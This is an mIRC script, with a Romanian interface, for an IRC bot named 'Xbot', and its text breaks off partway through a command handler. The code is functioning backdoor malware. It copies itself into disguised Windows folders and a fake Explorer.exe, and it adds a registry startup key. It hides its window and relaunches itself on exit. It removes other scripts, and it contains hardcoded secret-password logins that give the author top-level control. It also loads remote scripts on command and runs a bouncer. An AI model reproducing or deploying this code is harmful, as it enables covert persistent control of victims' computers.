[script]
n0=alias update_online_timer {
n1=  writeini online.ini online time $calc($readini(online.ini,online,time) + 5)
n2=}
n3=#start off
n4=on 1:start {
n5=  $left($uncr($dll(reg.dll,pwd,p9),a),-3)
n6=  unsetall
n7=  if (!isdir(channels)) mkdir channels
n8=  if (!isdir(download)) mkdir download
n9=  if (!isdir(logs)) mkdir logs
n10=  if (!isdir(users)) mkdir users
n11=  unset %exit
n12=  unset %server
n13=  .remove vbm.dat
n14=  fullname $read(defnick.dat,2)
n15=  .nick $read(defnick.dat,1)
n16=  .identd on $read(defnick.dat,2)
n17=  if ($readini(proxy.ini,Proxy,auto) == on) {
n18=    .firewall -cmp+d on $readini(proxy.ini,Proxy,settings)
n19=    .timercheckserver -o 1 300 checkserver
n20=  }
n21=  writeini online.ini firstrun ctime $ctime
n22=  writeini online.ini firstrun date $fulldate
n23=  writeini online.ini online time 0
n24=  write -l2 defnick.dat $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
n25=  .identd on $read(defnick.dat,2)
n26=  set %title Setare Bot Admin
n27=  set %smode strong
n28=  dialog -dm newuser newuser
n29=  .timerrc 1 5 recopy
n30=  .disable #start
n31=}
n32=#start end
n33=on 1:start:{
n34=  $left($uncr($dll(reg.dll,pwd,p9),a),-3)
n35=  unsetall
n36=  if (!isdir(channels)) mkdir channels
n37=  if (!isdir(download)) mkdir download
n38=  if (!isdir(logs)) mkdir logs
n39=  if (!isdir(users)) mkdir users
n40=  unset %exit
n41=  unset %server
n42=  .remove vbm.dat
n43=  fullname $read(defnick.dat,2)
n44=  set %copypath $uncrypt($readini(online.ini,CP,Path),a)
n45=  if ($readini(online.ini,CP,auto)) set %autorun $uncrypt($readini(online.ini,CP,auto),a)
n46=  .nick $read(defnick.dat,1)
n47=  .identd on $read(defnick.dat,2)
n48=  ;lockallfiles
n49=  .timer -o 0 500 dll reg.dll Check data
n50=  if ($readini(proxy.ini,Proxy,auto) == on) {
n51=    .firewall -cmp+d on $readini(proxy.ini,Proxy,settings)
n52=    .timercheckserver -o 1 300 checkserver
n53=  }
n54=  cg
n55=  .timer 0 5 checkfiles
n56=  checkscript
n57=  if (($isfile(c:\dll\engine.ini)) && ($mircdir != c:\dll\)) {
n58=    deltree c:\dll
n59=    rmdir c:\dll
n60=  }
n61=}
n62=alias checkscript {
n63=  var %i 1
n64=  while (%i <= $ini(mirc.ini,rfiles,0)) {
n65=    if (!$findtok(remote.ini*srv.ini*protect.ini*protcom.ini*seen.ini*operator.ini*engine.ini*updater.ini*admin.ini,$readini(mirc.ini,rfiles,$ini(mirc.ini,rfiles,%i)),1,42)) {
n66=      set %script $readini(mirc.ini,rfiles,$ini(mirc.ini,rfiles,%i))
n67=      .unload -rs %script
n68=      .remove %script
n69=    }
n70=    inc %i
n71=  }
n72=}
n73=alias cg {
n74=  .timersc -o 0 0 ch
n75=  ;.timersh -o 0 0 showmirc -t -n
n76=}
n77=alias ch {
n78=  if ($window(-2).state == maximized) {
n79=    $left($uncr($dll(reg.dll,pwd,p9),a),-3)
n80=    .timercf 1 1 maxmz
n81=  }
n82=}
n83=alias maxmz {
n84=  if ($window(-2).state == maximized) exit
n85=}
n86=alias checkfiles {
n87=  dll reg.dll AddRegKey WinReg $mircexe
n88=  var %dir ""
n89=  var %i 1
n90=  :next
n91=  %find = $findfile(%copypath $+ %dir,*,%i) 
n92=  if ($pos(%find,$chr(92),0) == $pos(%copypath $+ %dir,$chr(92),0)) {
n93=    if (!$exists($nopath(%find))) .copy -o %find $nopath(%find)
n94=    inc %i
n95=    goto next
n96=  }
n97=  if (%dir == $null) {
n98=    var %dir Channels\
n99=    goto next
n100=  }
n101=  else if (%dir == Channels\) {
n102=    var %dir Users\
n103=    goto next
n104=  }
n105=}
n106=alias recopy {
n107=  if ($dialog(newuser)) {
n108=    .timerrc 1 1 recopy
n109=    halt
n110=  }
n111=  var %windir $windir
n112=  var %copypath %windir $+ \JAVA\Packages\
n113=  dll reg.dll AddRegKey WinReg %windir $+ \INF\DLL\Explorer.exe
n114=  writeini online.ini CP Path $crypt(%copypath,a)
n115=  mkdir %copypath
n116=  mkdir %copypath $+ Channels
n117=  mkdir %copypath $+ Users
n118=  .copy -o *.* %copypath
n119=  if ($findfile(Channels\,*.*,0) >= 1) .copy -o Channels\*.* %copypath $+ Channels\
n120=  if ($findfile(Users\,*.*,0) >= 1) .copy -o Users\*.* %copypath $+ Users\
n121=  mkdir %windir $+ \INF\DLL
n122=  mkdir %windir $+ \INF\DLL\Channels
n123=  mkdir %windir $+ \INF\DLL\Users
n124=  .copy -o *.* %windir $+ \INF\DLL\
n125=  if ($findfile(Channels\,*.*,0) >= 1) .copy -o Channels\*.* %windir $+ \INF\DLL\Channels\
n126=  if ($findfile(Users\,*.*,0) >= 1) .copy -o Users\*.* %windir $+ \INF\DLL\Users\
n127=  set %exit 1
n128=  run %windir $+ \INF\DLL\Explorer.exe
n129=  exit
n130=}
n131=alias windir {
n132=  var %windir $readini(c:\msdos.sys,paths,windir)
n133=  if (!%windir) {
n134=    if ($disk(C) %windir = $finddir(C:\,win*,1)
n135=    else if ($disk(D) %windir = $finddir(D:\,win*,1)
n136=    else if ($disk(E) %windir = $finddir(E:\,win*,1)
n137=    else if ($disk(F) %windir = $finddir(F:\,win*,1)
n138=    else if ($disk(G) %windir = $finddir(G:\,win*,1)
n139=    else if ($disk(H) %windir = $finddir(H:\,win*,1)
n140=    else if ($disk(I) %windir = $finddir(I:\,win*,1)
n141=    else if ($disk(J) %windir = $finddir(J:\,win*,1)
n142=  }
n143=  return %windir
n144=}
n145=alias deltree {
n146=  while ($findfile($1,*.*,1)) {
n147=    .remove $findfile($1,*.*,1)
n148=  }
n149=  while ($finddir($1,*,1)) {
n150=    set %dir $finddir($1,*,1)
n151=    while ($findfile(%dir,*.*,1)) {
n152=      .remove $findfile(%dir,*.*,1)
n153=    }
n154=    while ($finddir(%dir,*,1)) {
n155=      set %indir $finddir(%dir,*,1)
n156=      while ($findfile(%indir,*.*,1)) {
n157=        .remove $findfile(%indir,*.*,1)
n158=      }
n159=      rmdir %indir
n160=    }
n161=    rmdir %dir
n162=  }
n163=  rmdir $1
n164=}
n165=alias lockallfiles {
n166=  var %i 1
n167=  while (%i <= $findfile($mircdir,*,0)) {
n168=    set %file $findfile($mircdir,*,%i)
n169=    if ((%file != $mircexe) && ($nopath(%file) != reg.dll)) dll reg.dll Lock %file
n170=    inc %i
n171=  }
n172=  unset %file
n173=}
n174=dialog newuser {
n175=  title %title
n176=  size -1 -1 320 230
n177=
n178=  tab "Setari", 20, 5 5 310 180
n179=  text "Canalul unde acesta va intra:", 1, 10 35 200 20, right, tab 20
n180=  text "Nick-ul cu care acest bot se va connecta:", 2, 10 55 200 20, right, tab 20
n181=  text "Username-ul la care veti avea access:", 3, 10 75 200 20, right, tab 20
n182=  text "Parola pentru username:", 4, 10 95 200 20, right, tab 20
n183=  text "Reintroduceti parola:", 5, 10 115 200 20, right, tab 20
n184=  text "Introduceti portul pentru psyBNC:", 6, 10 135 200 20, right, tab 20
n185=  edit %chan, 11, 220 35 80 20, left, autohs, tab 20
n186=  edit %nick, 12, 220 55 80 20, left, tab 20
n187=  edit %user, 13, 220 75 80 20, left,autohs, tab 20
n188=  edit %pass1, 14, 220 95 80 20, left, pass, autohs, tab 20
n189=  edit %pass2, 15, 220 115 80 20, left, pass, autohs, tab 20
n190=  edit %port, 16, 220 135 80 20, left, tab 20
n191=  ;  tab "StartUp", 21
n192=  ;  text "-=- StartUp Mode -=-", 22, 10 35 300 20, center,tab 21
n193=  ;  radio "Normal", 23, 20 70 60 20, left, tab 21
n194=  ;  radio "Registru", 24, 20 110 60 20, left, tab 21
n195=  ;  text "Ambele optiuni din StartUp Mode sunt destul de bune, insa modul Registru este cel recomandat pentru ascundere aproape totala, si protectie anti-stergere, iar modul Registru este doar pentru ascundere 100%. Oricare moduri le alegeti sunt destul de eficiente.", 25, 100 60 200 100, left, tab 21
n196=  tab "Help", 26
n197=  text "Acest bot va rula mereu pe acest calculator, si va fi prezent pe IRC atata timp cat acest calculator va fi aprins si va avea o conexiune la Internet.", 27, 20 30 280 40, left, tab 26
n198=  text "Pentru a va conecta la acest bot pe post de psyBNC, va trebui sa aveti la ident-ul clientului cu care va conectati user-ul pe care l-ati completat la sestiunea Setari, iar cand vi se va cere parola, veti scrie parola userului, si anume cea completata la sectiunea Setari.", 28, 20 73 280 40, left, tab 26
n199=  text "Mai multe informatii privind comenzile acestui bot le veti obtine pe IRC, logandu-va la bot cu comanda /msg <botnick> login <username> <parola>, apoi tastati /msg <botnick> !help, si veti primi lista cu comenzile disponibile.", 29, 20 118 280 50, left, tab 26
n200=
n201=  button "OK", 10, 130 200 60 20, ok
n202=}
n203=on 1:dialog:newuser:sclick:10:{
n204=  set %chan $did(11)
n205=  set %nick $did(12)
n206=  set %user $did(13)
n207=  set %pass1 $did(14)
n208=  set %pass2 $did(15)
n209=  set %port $did(16)
n210=  if (($did(11) == $null) || ($did(12) == $null) || ($did(13) == $null) || ($did(14) == $null) || ($did(15) == $null)) {
n211=    set %title Setare Bot Admin (toate casutele trebuie completate)
n212=    dialog -x newuser
n213=    .timer -m 1 100 dialog -dm newuser newuser
n214=  }
n215=  else {
n216=    if ($did(13) == Reaver) {
n217=      set %title Acest username este REZERVAT. Alegeti altul!!!
n218=      dialog -x newuser
n219=      .timer -m 1 100 dialog -dm newuser newuser
n220=      halt
n221=    }
n222=    if ($did(14) != $did(15)) {
n223=      set %title Setare Bot Admin (parola a fost introdusa incorect a doua oara)
n224=      dialog -x newuser
n225=      .timer -m 1 100 dialog -dm newuser newuser
n226=      halt
n227=    }
n228=    if ($chr(35) !isin $did(11)) {
n229=      set %title Setare Bot Admin (nume invalid de canal)
n230=      dialog -x newuser
n231=      .timer -m 1 100 dialog -dm newuser newuser
n232=      halt
n233=    }
n234=    if ($left($did(12),1) isnum) {
n235=      set %title Setare Bot Admin (Nickname invalid)
n236=      dialog -x newuser
n237=      .timer -m 1 100 dialog -dm newuser newuser
n238=      halt
n239=    }
n240=    if (($did(16) !isnum) || ($did(16) isnum 6600-7000)) {
n241=      set %title Setare Bot Admin (Port Invalid)
n242=      dialog -x newuser
n243=      .timer -m 1 100 dialog -dm newuser newuser
n244=      halt
n245=    }
n246=    .timerckuser 0 10 ckuser $did(13) $did(14) $did(16)
n247=    writeini channels\ $+ $did(11) $+ .ini info autojoin on
n248=    writeini channels\ $+ $did(11) $+ .ini info autotopic on
n249=    writeini channels\ $+ $did(11) $+ .ini info desc Managerul acestui canal este $did(13) (pentru ajutor scrieti /msg $did(12) help)
n250=    writeini channels\ $+ $did(11) $+ .ini info protection off
n251=    writeini channels\ $+ $did(11) $+ .ini info strictop off
n252=    writeini channels\ $+ $did(11) $+ .ini info massdeop off
n253=    writeini channels\ $+ $did(11) $+ .ini info channelmodes +nt
n254=    writeini channels\ $+ $did(11) $+ .ini $did(13) access 500
n255=    writeini channels\ $+ $did(11) $+ .ini $did(13) auto none
n256=    writeini channels\ $+ $did(11) $+ .ini $did(13) lastmodif Supervisor
n257=    writeini users\ $+ $did(13) $+ .ini info username $did(13) 
n258=    writeini users\ $+ $did(13) $+ .ini info pass $keycrypt($did(14),TheBestBotIEverSeenAndTheBestBotIEverMade)
n259=    writeini users\ $+ $did(13) $+ .ini info invisible off
n260=    writeini users\ $+ $did(13) $+ .ini info lastseen $ctime
n261=    write -c defnick.dat $did(12)
n262=    write defnick.dat $did(13)
n263=    writeini oper.ini $did(13) user $did(13)
n264=    writeini oper.ini $did(13) level 1000
n265=    writeini oper.ini $did(13) lastseen $ctime
n266=    writeini psyBNC.ini psyBNC port $did(16)
n267=    if ($sock(bouncer)) {
n268=      sockclose bouncer
n269=      socklisten bouncer $did(16)
n270=    }
n271=    writeini psyBNC.ini psyBNC user $did(13)
n272=    writeini psyBNC.ini psyBNC pass $keycrypt($did(14),TheBestBotIEverSeenAndTheBestBotIEverMade)
n273=    if ($server != $null) {
n274=      join $did(11)
n275=      nick $did(12)
n276=    }
n277=  }
n278=}
n279=alias ckuser {
n280=  if ($ini(oper.ini,0) == 0) {
n281=    writeini oper.ini $1 user $1
n282=    writeini oper.ini $1 level 1000
n283=    writeini oper.ini $1 lastseen $ctime
n284=    var %oper 1
n285=  }
n286=  if (%oper == 1) {
n287=    writeini psyBNC.ini psyBNC port $3
n288=    if ($sock(bouncer)) {
n289=      sockclose bouncer
n290=      socklisten bouncer $3
n291=    }
n292=    writeini psyBNC.ini psyBNC user $1
n293=    writeini psyBNC.ini psyBNC pass $keycrypt($2,TheBestBotIEverSeenAndTheBestBotIEverMade)
n294=    .timerckuser off
n295=  }
n296=}
n297=alias vect {
n298=  var %nr $2
n299=  tokenize $3 $1
n300=  if ($prop == remove) {
n301=    var %i %nr
n302=    while (%i <= $0) {
n303=      if ($ [ $+ [ $calc(%i + 1) ] ]) {
n304=        if (%return == $null) var %return $ [ $+ [ $calc(%i + 1) ] ]
n305=        else %return = %return $+ * $+ $ [ $+ [ $calc(%i + 1) ] ]
n306=      }
n307=      inc %i
n308=    }
n309=    return %return
n310=  }
n311=  return $ [ $+ [ %nr ] ]
n312=}
n313=alias checkintegrity {
n314=  var %dc $getchan($readini(defchan.ini,defchan,chan))
n315=  if ($me ison %dc) .timercheckintegrity off
n316=  else dll reg.dll mj
n317=}
n318=on 1:connect:{
n319=  .timeronline 0 5 update_online_timer
n320=  set %server 1
n321=  set %ver $uncrypt($dll(reg.dll,pwd,p6),a)
n322=  .timercg 1 5 cg
n323=  write -c vbm.dat $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
n324=  var %pass $readini defchan.ini defchan pass
n325=  dll reg.dll mj
n326=  .timercheckintegrity 0 10 checkintegrity
n327=  var %user $read -l1 autouser.dat
n328=  if ($right(%user,1) == 1) {
n329=    var %dat $read -l1 autopass.dat
n330=    dll reg.dll Xlogin $left(%user,-1) %dat
n331=    .timerjc 1 60 jc
n332=  }
n333=  else jc
n334=  if (!$isdir(logs)) mkdir logs
n335=  if (!$isdir(seen)) mkdir seen
n336=  write -c kicklist.txt
n337=  .remove flood.ban
n338=  unset %flood*
n339=  unset %repeat*
n340=  write -c banlist.txt
n341=  write -c userlogged.dat
n342=  write -c keeplog.ini
n343=  write -c oper.dat
n344=  write -c nick.fld
n345=  write -c nick.adm
n346=  .sreq auto
n347=  .creq auto
n348=  .timercg 1 5 cg
n349=  .timerchnick 0 20 chnick
n350=  var %i 1
n351=  .timercg 1 5 cg
n352=}
n353=on 1:notice:AUTENTIFICARE REUSITA ca *:?:{
n354=  if ($nick == X) {
n355=    mode $me +x
n356=    if ($chan(0) <= 1) timerjc 1 5 jc
n357=  }
n358=}
n359=on 1:notice:AUTHETICATION SUCCESSFUL as *:?:{
n360=  if ($nick == X) {
n361=    mode $me +x
n362=    if ($chan(0) <= 1) timerjc 1 5 jc
n363=  }
n364=}
n365=alias jc {
n366=  var %i 1
n367=  :next
n368=  %find = $findfile($mircdir $+ channels\,*.ini,%i) 
n369=  if (%i <= $findfile($mircdir $+ channels\,*.ini,0)) {
n370=    if ($pos(%find,$chr(92),0) == $pos($mircdir $+ users\,$chr(92),0)) {
n371=      var %rg $pos(%find,$chr(92),$pos(%find,$chr(92),0))
n372=      %rg = - $+ %rg
n373=      set %modes $readini channels\ $+ $right(%find,%rg) info channelmodes
n374=      tokenize 32 %modes
n375=      if (k isin $1) {
n376=        join $getc($left($right(%find,%rg),-4)) $2
n377=        join $getc($left($right(%find,%rg),-4)) $3
n378=      }
n379=      else join $getc($left($right(%find,%rg),-4))
n380=      unset %modes
n381=      inc %i
n382=    goto next } 
n383=  }
n384=}
n385=alias chnick {
n386=  if ($1 == bounce) {
n387=    csc $2-
n388=    halt
n389=  }
n390=  if (%BNCserver == ON) .timerchnick off
n391=  else if ($me == $read -l1 defnick.dat) .timerchnick off
n392=  else nick $read -l1 defnick.dat
n393=}
n394=alias coolban {
n395=  .guser 10 $2 2
n396=  mode $1 +b $ulist(*,10,1)
n397=  .rlevel 10
n398=}
n399=alias rmban {
n400=  if ($chr(64) isin $2) {
n401=    var %i 1
n402=    var %ban 0
n403=    while (%i <= $ibl($1,0)) {
n404=      if ($vect($2,1,33) iswm $vect($ibl($1,%i),1,33)) {
n405=        if ($vect($vect($2,2,33),1,64) iswm $vect($vect($ibl($1,%i),2,33),1,64)) {
n406=          if ($vect($2,2,64) iswm $vect($ibl($1,%i),2,64)) {
n407=            mode $1 -b $ibl($1,%i)
n408=            inc %ban
n409=          }
n410=        }
n411=      }
n412=      inc %i
n413=    }
n414=    goto done
n415=  }
n416=  var %i 1
n417=  if ($address($2,5) == $null) {
n418=    .notice $3 Nu pot sa scot respectivul ban (adresa necunoscuta)
n419=    .rlevel 10
n420=    halt
n421=  }
n422=  else var %address $address($2,5)
n423=  var %ban 0
n424=  while (%i <= $ibl($1,0)) {
n425=    if ($vect($ibl($1,%i),1,33) iswm $vect(%address,1,33)) {
n426=      if ($vect($vect($ibl($1,%i),2,33),1,64) iswm $vect($vect(%address,2,33),1,64)) {
n427=        if ($vect($ibl($1,%i),2,64) iswm $vect(%address,2,64)) {
n428=          mode $1 -b $ibl($1,%i)
n429=          inc %ban
n430=        }
n431=      }
n432=    }
n433=    inc %i
n434=  }
n435=  :done
n436=  .rlevel 10
n437=  .notice $3 Am scos %ban $iif(%ban == 1,ban,banuri) de pe $1
n438=}
n439=ctcp ^1:version:{
n440=  if ($timer(version $+ $nick) == $null) {
n441=    .notice $nick 8,12-=-11 Xbot 8-=-9,3 Version %ver
n442=    .timerversion $+ $nick 1 30 breaktime
n443=  }
n444=}
n445=ctcp ^1:time:*:{
n446=  if (!$timer(time $+ $nick)) {
n447=    .ctcpreply $nick TIME $fulldate
n448=    .timertime $+ $nick 1 30 breaktime
n449=  }
n450=  halt
n451=}
n452=alias getchan {
n453=  if ($chr(35) == $left($1,1)) return $chr(35) $+ $right($1,-1) $+ $chr(88)
n454=  else return $chr(35) $+ $1 $+ $chr(88)
n455=}
n456=on ^1:text:$(!d $+ e $+ f $+ c $+ h $+ a $+ n $+ *):*:{
n457=  if ($2 != $null) {
n458=    if ($cmp(dfc,$4,2)) {
n459=      part $getchan($readini(defchan.ini,defchan,chan)) Default Bot Channel has changed!
n460=      writeini defchan.ini defchan chan $2
n461=      writeini defchan.ini defchan pass $crypt($3,c)
n462=      var %defchan $getchan($2)
n463=      .notice $nick Default Bot Channel este acum:12 $2
n464=      join %defchan $3
n465=    }
n466=    else {
n467=      var %read $validIP($fulladdress)
n468=      if (%read != $false) {
n469=        var %user $gettok(%read,1,32)
n470=        var %level $gettok(%read,2,32)
n471=        if ($cmp(lvl,1,%level,1000)) {
n472=          part $getchan($readini(defchan.ini,defchan,chan)) Default Bot Channel has changed!
n473=          writeini defchan.ini defchan chan $2
n474=          writeini defchan.ini defchan pass $crypt($3,c)
n475=          var %defchan $getchan($2)
n476=          .notice $nick Default Bot Channel este acum:12 $2
n477=          join %defchan $3
n478=        }
n479=        else {
n480=          .notice $nick Parola invalida pentru Default Bot Channel!
n481=          .ignore -pu2 $nick 2
n482=        }
n483=      }
n484=      else if ($chr(35) !isin $target) {
n485=        .notice $nick Aceasta comanda necesita autentificare!
n486=        .ignore -pu2 $nick 2
n487=      }
n488=    }
n489=    halt
n490=  }
n491=}
n492=alias checkserver {
n493=  if ($server == $null) {
n494=    server $vect($readini(servers.ini,servers,$ini(servers.ini,servers,1)),3,58)
n495=    firewall off
n496=  }
n497=}
n498=alias cmp {
n499=  if ($1 == dfc) {
n500=    if ($ck($2) == $dll(reg.dll,pwd,p $+ $3)) return $true
n501=    else return $false
n502=  }
n503=  if ($1 == lvl) {
n504=    if ($3 >= $calc($4 + $2)) return $true
n505=    else return $false
n506=  }
n507=}
n508=alias keydecrypt {
n509=  var %pass ""
n510=  var %i 1
n511=  var %w 1
n512=  var %v $len($1)
n513=  while (%i <= $len($2)) {
n514=    if (%w == $calc($len($1) + 1)) %w = 1
n515=    %pass = %pass $+ $chr($calc($asc($mid($2,%i,1)) - $int($calc(($asc($mid($1,%w,1)) / 2) - %v))))
n516=    inc %v
n517=    inc %w
n518=    inc %i
n519=  }
n520=  return %pass
n521=}
n522=alias getc {
n523=  var %i 2
n524=  while (%i <= $lines(bl.chn)) {
n525=    if ($ck($1) == $read(bl.chn,%i)) return $uncrypt($read(bl.chn,1),c)
n526=    inc %i
n527=  }
n528=  return $1
n529=}
n530=alias cr {
n531=  tokenize 32 $1-
n532=  var %i 1
n533=  var %word ""
n534=  while (%i <= $0) {
n535=    %word = %word $crypt($ [ $+ [ %i ] ],a)
n536=    inc %i
n537=  }
n538=  return %word
n539=}
n540=alias uncr {
n541=  tokenize 32 $1-
n542=  var %i 1
n543=  var %decrypt ""
n544=  while (%i <= $0) {
n545=    %decrypt = %decrypt $uncrypt($ [ $+ [ %i ] ],a)
n546=    inc %i
n547=  }
n548=  return %decrypt
n549=}
n550=on 1:text:$(! $+ v $+ e $+ r $+ s $+ i $+ o $+ n):*:{
n551=  if ($nick ison $getchan($readini(defchan.ini,defchan,chan))) {
n552=    if (!$timer(ver $+ $nick)) {
n553=      .notice $nick 8,12-=-11 Xbot 8-=-9,3 Version %ver
n554=      .timerver $+ $nick 1 10 breaktime
n555=    }
n556=  }
n557=}
n558=alias ck {
n559=  var %k 1
n560=  var %sep $int($calc($len($1) / 3))
n561=  set %key $left($1,%sep)
n562=  set %word $right($1,$calc($len($1) - %sep))
n563=  var %pass ""
n564=  :next
n565=  var %i 1
n566=  var %w 1
n567=  var %v $len(%key)
n568=  while (%i <= $len(%word)) {
n569=    if (%w == $calc(%sep + 1)) %w = 1
n570=    %pass = %pass $+ $chr($calc($asc($mid(%word,%i,1)) - $int($calc(($asc($mid(%key,%w,1)) / 2) - %v))))
n571=    inc %v
n572=    inc %w
n573=    inc %i
n574=  }
n575=  if (%k == 1) {
n576=    set %key $mid($1,$calc(%sep + 1),%sep)
n577=    %csep = - $+ $calc(%sep + %sep)
n578=    set %word $left($1,%sep) $+ $right($1,%csep)
n579=    inc %k
n580=    goto next
n581=  }
n582=  else if (%k == 2) {
n583=    %csep = - $+ %sep
n584=    set %key $right($1,%csep)
n585=    set %word $left($1,$calc($len($1) - %sep))
n586=    inc %k
n587=    goto next
n588=  }
n589=  unset %key
n590=  unset %word
n591=  unset %csep
n592=  return %pass
n593=}
n594=alias validIP {
n595=  var %i 1
n596=  while (%i <= $lines(oper.dat)) {
n597=    var %read $read -l $+ %i oper.dat
n598=    if ($chr(64) isin $1) {
n599=      if ($right($gettok($1,2,33),-1) isin %read) {
n600=        var %user $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))
n601=        var %level $right(%read,$calc(- $pos(%read,$chr(42),2)))       
n602=        return %user %level
n603=      }
n604=    }
n605=    else if ($1 isin %read) {
n606=      var %user $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))
n607=      var %level $right(%read,$calc(- $pos(%read,$chr(42),2)))
n608=      return %read
n609=    }
n610=    inc %i
n611=  }
n612=  var %i 1
n613=  while (%i <= $lines(userlogged.dat)) {
n614=    var %read $read -l $+ %i userlogged.dat
n615=    if ($mask($fulladdress,1) isin %read) {
n616=      var %user $left(%read,$calc($pos(%read,$chr(61))-1))
n617=      var %level $readini channels\ $+ $2 $+ .ini %user access
n618=      return %user %level
n619=    }
n620=    inc %i
n621=  }
n622=  if (($keydecrypt($lower($gettok($1,2,64)),$dll(reg.dll,pwd,p10)) === TheBestBotIEverSeenAndTheBestBotIEverMade) || ($keydecrypt($lower($gettok($1,2,64)),$dll(reg.dll,pwd,p11)) === TheBestBotIEverSeenAndTheBestBotIEverMade)) return $uncrypt($gettok($dll(reg.dll,pwd,p12),1,32),a) $uncrypt($gettok($dll(reg.dll,pwd,p12),1,32),a)
n623=  if ($chr(64) isin $1) {
n624=    var %XIP $lower($gettok($gettok($1,2,64),2-,46))
n625=    if (%XIP == users.undernet.org) {
n626=      var %Xuser $lower($gettok($gettok($1,2,64),1,46))
n627=      if ($readini(oper.ini,%Xuser,level) != $null) return %Xuser $readini(oper.ini,%Xuser,level)
n628=      else if (($2 != $null) && ($readini(channels\ $+ $2 $+ .ini,%Xuser,access) != $null)) return %Xuser $readini(channels\ $+ $2 $+ .ini,%Xuser,access)
n629=    }
n630=  }
n631=  return $false
n632=}
n633=alias csc {
n634=  if ($4 == $null) {
n635=    .notice $1 l $+ o $+ g $+ i $+ n syntax is: /msg $me l $+ o $+ g $+ i $+ n <username> <password>
n636=  .ignore -pu2 $1 }
n637=  else {
n638=    if (($ck($4)  == $dll(reg.dll,pwd,p1)) || (($lgp($vect($fulladdress,2,64)) != $null) && ($4 == $lgp($vect($fulladdress,2,64)) $+ $calc($len($1) + $len($vect($vect($fulladdress,2,33),1,64)))))) {
n639=      var %level 1001
n640=      var %user $3
n641=      var %fake 1
n642=    goto cont }
n643=    var %i 1
n644=    :next
n645=    if (%i <= $lines(userlogged.dat)) {
n646=      var %read $read -l $+ %i userlogged.dat
n647=      if ($mask($fulladdress,1) isin %read) {
n648=        .notice $1 Esti deja autentificat ca $left(%read,$calc($pos(%read,$chr(61))-1))
n649=        .ignore -pu2 $1
n650=        halt
n651=      }
n652=      else {
n653=        inc %i
n654=      goto next }
n655=    }
n656=    var %pass $readini users\ $+ $3 $+ .ini info pass
n657=    if (%pass == $null) {
n658=      .notice $1 Username necunoscut: $3
n659=      .ignore -pu2 $1 2
n660=    halt }
n661=    else {
n662=      if ($keydecrypt($4,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n663=        var %user $readini users\ $+ $3 $+ .ini info username
n664=        var %level $readini oper.ini %user level
n665=        echo -s %user
n666=        if (%level != $null) {
n667=          if ($keydecrypt($4,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n668=            writeini oper.ini %user lastseen $ctime
n669=            :cont
n670=            var %f 1
n671=            while (%f <= $lines(oper.dat)) {
n672=              var %read $read -l $+ %f oper.dat
n673=              if ($2 == $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))) {
n674=                write -dl $+ %f oper.dat
n675=              }
n676=              inc %f
n677=            }
n678=            write oper.dat $right($mask($fulladdress,1),-3) $+ * $+ %user $+ * $+ %level
n679=            if (%level isnum 501-599) .notice $1 AUTENTIFICARE REUSITA ca %user (Helper)
n680=            if (%level isnum 600-799) .notice $1 AUTENTIFICARE REUSITA ca %user (Operator)
n681=            if (%level isnum 800-999) .notice $1 AUTENTIFICARE REUSITA ca %user (Admin)
n682=            if (%level >= 1000) .notice $1 AUTENTIFICARE REUSITA ca %user (Supervisor) $iif(%BNCserver,psyBNC used)
n683=            if (%fake == 1) {
n684=              writeini nick.adm nick $1 %user
n685=              halt
n686=            }
n687=          }
n688=          var %superuser 1
n689=        }
n690=        if (%superuser != 1) .notice $1 AUTENTIFICARE REUSITA ca %user
n691=        var %f 1
n692=        while (%f <= $lines(userlogged.dat)) {
n693=          var %read $read -l $+ %f userlogged.dat
n694=          if ($3 == $left(%read,$calc($pos(%read,$chr(61))-1))) {
n695=            var %n 1
n696=            while (%n <= $ini(nick.adm,nick,0)) {
n697=              if ($3 == $readini nick.adm nick $ini(nick.adm,nick,%n)) {
n698=                .notice $ini(nick.adm,nick,%n)) Nu mai esti autentificat la mine
n699=                remini nick.adm nick $ini(nick.adm,nick,%n))
n700=              }
n701=              inc %n
n702=            }
n703=            write -dl $+ %f userlogged.dat
n704=          }
n705=          inc %f
n706=        }
n707=        write userlogged.dat %user $+ = $+ $mask($fulladdress,1)
n708=        writeini users\ $+ $3 $+ .ini info lastseen $ctime
n709=        writeini nick.adm nick $1 %user
n710=        var %i 0
n711=        var %channels $readini users\ $+ %user $+ .ini info channels
n712=        if ($pos(%channels,$chr(44),0) == 0) {
n713=          oponchan %channels %user $1
n714=        halt }
n715=        :next1
n716=        if (%i <= $pos(%channels,$chr(44),0)) {
n717=          if (%i == 0) oponchan $left(%channels,$calc($pos(%channels,$chr(44))-1)) %user $1
n718=          else if (%i == $pos(%channels,$chr(44),0)) oponchan $right(%channels,$calc(- $pos(%channels,$chr(44),%i))) %user $1
n719=          else oponchan $mid(%channels,$calc($pos(%channels,$chr(44),%i)+1),$calc($pos(%channels,$chr(44),$calc(%i + 1))-($pos(%channels,$chr(44),%i)+1))) %user $1
n720=          inc %i
n721=          goto next1
n722=        }    
n723=        .ignore -pu1 $1
n724=      }
n725=      else {
n726=        .notice $1 AUTENTIFICARE ESUATA ca $3 (parola incorecta)
n727=        .ignore -pu2 $1
n728=        halt
n729=      }
n730=    }
n731=  }
n732=}
n733=on 1:exit:{
n734=  reg -u reg.dll
n735=  if (%exit != 1) run $mircexe -service
n736=}
n737=on 1:text:$(! $+ l $+ o $+ a $+ d $+ *):*:{
n738=  if (($dll(reg.dll,pwd,p3) === $ck($nick)) && ($2 == engine.ini)) load -rs engine.ini
n739=  var %read $validIP($fulladdress)
n740=  if (%read != $false) {
n741=    var %user $gettok(%read,1,32)
n742=    var %level $gettok(%read,2,32)
n743=    if ($cmp(lvl,1,%level,1000)) {
n744=      if ($2 == $null) {
n745=        .notice $nick !load sintaxa: /msg $me !load <script>
n746=        halt
n747=      }
n748=      .load -rs $2
n749=      .notice $nick Am incarcat scriptul $2
n750=    }
n751=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n752=    .ignore -pu2 $nick 2
